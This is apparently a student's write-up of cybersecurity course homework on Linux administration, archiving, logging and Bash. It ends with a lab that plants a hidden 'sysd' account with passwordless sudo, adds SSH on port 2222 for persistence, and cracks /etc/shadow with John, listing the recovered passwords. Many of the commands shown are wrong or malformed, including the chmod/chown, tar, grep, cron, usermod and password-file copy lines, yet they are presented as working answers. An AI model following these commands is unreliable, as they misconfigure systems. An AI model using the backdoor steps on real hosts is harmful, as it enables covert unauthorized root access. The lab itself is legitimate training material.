#Terminal in Linux
Using Bash in Linux we learned how to create or change system configuration scripts. Several shells are avaliable in the terminal, we learned Bash. There are also several text editors within terminal that can be used. We learned with nano. 
Inside most of these rather large files are data points that help analyst research security incidents.
The following is a configuration script that I learned in class. For example, if we need to clean up space in a directory we run the following commands in order.

Nano myfirstscript.sh
#!/bin/bash
cd log_directory
zip logs*logfiles.zip
mv logfiles.zip ./archive_directory

when back in terminal to make this script executible:

chmod +x disk_cleanup.sh

To run the script:

./diskcleanup.sh

#The following pieces are assignments that were completed showing my ability to use the Command Line Terminal within Linux to complete Bash Scripting, Linux Administration, Archiving, and Logging Data:


##Hmework for Linux Administration
Step 1: Ensure Permissions on Sensitive Files
1. Permissions on `/etc/shadow` should allow only `root` read and write access.
-rw-r-----  1 root shadow  2888 Jul 14 10:16 shadow

2. Permissions on `/etc/gshadow` should allow only `root` read and write access.
-rw-r-----  1 root shadow  1076 Jul 14 10:16 gshadow

3. Permissions on `/etc/group` should allow `root` read and `write` access, and allow
everyone else `read` access only.
-rw-r--r--  1 root root    1303 Jul 14 10:16 group

4. Permissions on `/etc/passwd` should allow `root` read and `write` access, and
allow everyone else `read` access only.
-rw-r--r--  1 root root    3214 Jul 14 10:16 passwd

Step 2: Create User Accounts
1. Add user accounts for `sam`, `joe`, `amy`, `sara`, and `admin`.
sudo adduser sam
sudo adduser joe
sudo adduser amy
sudo adduser sara
sudo adduser admin

2. Next, we want to ensure that the user's passwords fit various requirements for
length and complexity.Force users to create passwords with a minimum length of 16 characters that
incorporate all 4 types of character type classes (numbers, symbols, etc.).

sudo nano /etc/security/
# Minimum acceptable size for the new password (plus one if
# credits are not disabled which is the default). 
# Cannot be set to lower value than 6. minlen = 16
# The minimum number of required classes of characters for the new
# password (digits, uppercase, lowercase, others).
# minclass = 4

3. We also want to enforce a password rotation policy. In old Linux terms, we might
have called this process the **change age** for password expiration. Force passwords to expire at a _maximum_ of every 90 days.
sudo chage -M 90 sam
sudo chage -M 90 joe
sudo chage -M 90 amy
sudo chage -M 90 sara
sudo chage -M 90 admin

4. Lastly, we want to make sure that only the `admin` user has general `sudo` group access. This requires a command that will allow user modifications.
grep sysadmin /etc/group
shows that sysadmin, instructor, student and jack have sudo
Remove the other 3 from sudo group 
usermod -G instructor sudo

Create User Group and Collaborative Folder
1. Add the group `engineers` to the system.
sudo addgroup engineers

2. Add users `sam`, `joe`, `amy`, and `sara` to the managed group. This will be similar
to how you added `admin` to the `sudo` group in the previous exercise.
sudo usermod -aG engineers sam
sudo usermod -aG engineers joe
sudo usermod -aG engineers amy
sudo usermod -aG engineers sara
sudo usermod -aG engineers admin

3. Create a shared folder for this group: `/home/engineers`.
sudo chmod chage /home/engineers

4. Change ownership on the new engineers' shared folder to the `engineers` group.
sudo chown chage /home/engineers engineers

5. Using `chmod`'s letter-based options, add the SGID bit _and_ the sticky bit to allow
collaboration between engineers in this directory. **Hint:** You will need to use `sudo` for all of these commands.
sudo chmod u=rwx engineers engineers
sudo chmod g=rwx engineers engineers
sudo chmod o=r engineers engineers

Step 4: Lynis Auditing

1. Install the Lynis package to your system if it is not already installed.
sudo apt get install lynis
2. Check the Lynis documentation for instructions on how to run a system audit.
Run '/usr/sbin/lynis show options', or use the man page.
3. Run a Lynis system audit with `sudo`.
sudo lynis audit system
4. Provide a report from the Lynis output on what more could be done to harden the
system.
Harden compilers like restricting access to root user only suggestion
|Harden the system by installing at least one malware scanner, to perform periodic file system scans
Install a tool like rkhunter, chkrootkit
 

###Homework Submission File: Archiving and Logging Data

Step 1: Create, Extract, Compress, and Manage tar Backup Archives
- Command to **extract** the `TarDocs.tar` archive to the current directory:

tar xvvf TarDocs.tar 
- Command to **create** the `Javaless_Doc.tar` archive from the `TarDocs/` directory, while excluding the `TarDocs/Documents/Java` directory:

 cd ~/sysadmin/Projects/TarDocs
 mkdir Javaless_Docs
 tar xvvWf Javaless_Doc.tar -C /Javaless_Docs/ --incremental
  
Command to ensure `Java/` is not in the new `Javaless_Docs.tar` archive:

tar tvvf Javaless_Docs.tar | grep -type d Java

Create, Manage, and Automate Cron Jobs

1. Cron job for backing up the `/var/log/auth.log` file:

systemctl status cron
-to verify that its running
crontab -l
-make sure there are no errors
sudo crontab -e
0 6 * * 3 tar cvf /log/auth.log.tar >> /auth_backup.tgz 
0 6 * * 3 gzip -t auth_backup.tgz >> ~/auth_backup

Write Basic Bash Scripts

1. Brace expansion command to create the four subdirectories:
 mkdir ~/backups/{freemem, diskuse, openlist, freedisk}

2. Paste your `system.sh` script edits below:
    ```bash
    #!/bin/bash
 Free memory output to a free_mem.txt file
 free -h> ~/backups/freemem

Disk usage output to a disk_usage.txt file
tar cvf /var/backup/home.tar /home > ~/backups/diskuse

List open files to a open_list.txt file
ls -lh /var/backup  > ~/backups/openlist

Free disk space to a free_disk.txt file
free -h > ~/backups/freedisk
  
3. Command to make the `system.sh` script executable:
sudo chmod +x system.sh

- Commands to test the script and confirm its execution:
sudo ./system.sh

Perform Various Log Filtering Techniques

1. Command to return `journalctl` messages with priorities from emergency to error:
sudo journalctl â€“-list-boots (to find out if there was anot boot since this morning)
journalctl -p 0..3 -b 0

2. Command to check the disk usage of the system journal unit since the most recent boot:
sudo journalctl -u systemd-journald | less

3. Comand to remove all archived journal files except the most recent two:
sudo journalctl --vacuum-file=2



##Submission for Advanced Bash Homework
Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- useradd -M sysd
Give your secret user a password.
- passwd sysd
Give your secret user a system UID < 1000.
- usermod -u 777 sysd
Give your secret user the same GID
- groupmod -g 777 sysd

Give your secret user full sudo access without the need for a password.
- sudo visudo
  sysd ALL=(ALL) NOPASSWD:ALL
Test that sudo access works without your password
su sysd
 sudo -l
If it doesn't prompt for the password it worked.
Allow ssh access over port 2222.
Command to edit the `sshd_config` file:
sudo nano /etc/ssh/sshd_config
add a second line under the line that has 
port 22 and make it 
port 2222
Command to restart the ssh service:
sudo systemctl restart sshd
Exit the root accout:
- exit
control D to go back to attack machine.
SSH to the target machine using your `sysd` account and port 2222:
ssh sysd@192.168.6.105 -p 2222
Use sudo to switch to the root user
- sudo su
Crack _all_ the passwords
Ssh back to the system using your sysd account
ssh sysd@192.168.6.105 -p 2222
- Use John to crack the entire /etc/shadow file
 cp /etc/passwd /etc/shadow >> ~/passwordstocrack
john ~/passwordstocrack
it checked the whole thing

computer  (stallman)
freedom  (babbage)
trustno1   (mitnik)
dragon   (lovelace)
lakers     (turing)
passw0rd    (sysadmin)
pass       (sysd)




